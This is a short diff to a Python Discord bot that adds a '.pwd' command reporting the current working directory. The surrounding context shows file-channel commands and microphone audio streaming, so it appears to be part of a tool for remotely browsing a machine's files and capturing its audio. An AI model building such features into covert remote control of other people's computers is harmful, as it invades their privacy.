@@ -165,6 +165,9 @@ async def on_message(message):
         else:
             reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
+    elif message.content == '.pwd':
+        reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
+
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
         p = pyaudio.PyAudio()
